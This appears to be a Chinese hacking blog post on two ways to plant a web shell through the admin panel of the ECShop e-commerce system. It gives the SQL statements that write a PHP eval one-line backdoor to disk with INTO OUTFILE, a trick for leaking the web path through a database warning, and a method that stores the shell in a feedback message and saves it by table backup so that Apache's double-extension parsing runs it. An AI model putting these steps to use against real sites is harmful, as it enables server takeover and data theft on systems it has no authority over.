再说两种ecshop后台拿shell的方法


ecshop后台拿shell的方法，除了oldjun大牛的那个和上次说的那个，又发现两种。但是各有个的限制条件，听我一一道来。

 

其一：

ecshop后台有一个功能是sql查询，如图：



其实感觉在一个管理系统的后台放这么个功能根本没用，有多少网站管理员有这么高的觉悟，会用这个？

不过也不错，便宜了我们小菜拿shell。

方法就像phpmyadmin一样直接操作sql语句导出一句话木马拿shell。

语句如下：



show databases;

use 数据库名;

 create a(cmd text not null);

 insert into a(cmd) values('<?php eval($_POST[cmd]);?>');

select cmd from a into outfile '导出路径';

drop table if exists a;

很常规的语句。也许有人会问不知道网站路径怎么办，那要导出到哪呢？这里有一个技巧就是 use 数据库名; 这句话，其实在这个sql查询功能中默认用的数据库就是本网站的数据库，开发者设计的时候不会考虑你去use 其他的数据库，所以这里你用"use 数据名库"这句时，会产生一个警告，但并不影响sql的运行，却可以成功爆出网站的路径，多次测试均成功，如图：




这样就爆出了路径，用于导出。

但是有个问题是你最后outfile文件时如果不是mysql的root权限，是没有权限导出的，所以这种方法必须要求你的mysql权限为root。

其二

另外一种是利用ecshop后台的数据库备份功能。如图：




这里选择自定义备份，目的是使你备份出来的文件尽量的小，要是太大的话也很麻烦。

然后去前台留个言，内容是我们的一句话木马，接着在后台选择备份ecs_feedback这张表，就是存放留言的表，如图：



然后会显示备份成功。

但是ecshop备份的文件都强行会在你填的备份的名字后面加上.sql扩展名(元备份名我填的是l4yn3.php)，如图。



这么做无非就是提高安全性，可是设计者忽略了一个问题，如果php是在apache下运行的，利用apache的文件解析漏洞这种方式形同虚设。

因为apache有个漏洞就是对文件名是1.php.sql这种形式，只要最后的文件扩展名是apache不能能解析的，他就会按照php文件来解析它，那在这里sql文件就是apache不能够解析的文件，那么他理所当然会把这个文件当作php文件来执行。

所以如果是apache+php的话，即使文件名变成了上面这样，也可以正常解析，你所需要做的就是点一下备份后的链接。

所以您看出来了，这种拿shell的方式是需要你的环境是apache+php的。

 而且还有个条件是GPC魔术转换不能开启，所以也很鸡肋。

两种方式没有上次说的那位大牛的那么通杀，只是给大家提供个思路，仅此而已。

由于之前是用shell测试的，可是写文章的时候是在本地测试，环境有点问题，第二种方式一句话成功解析的图就不截了，请见谅。
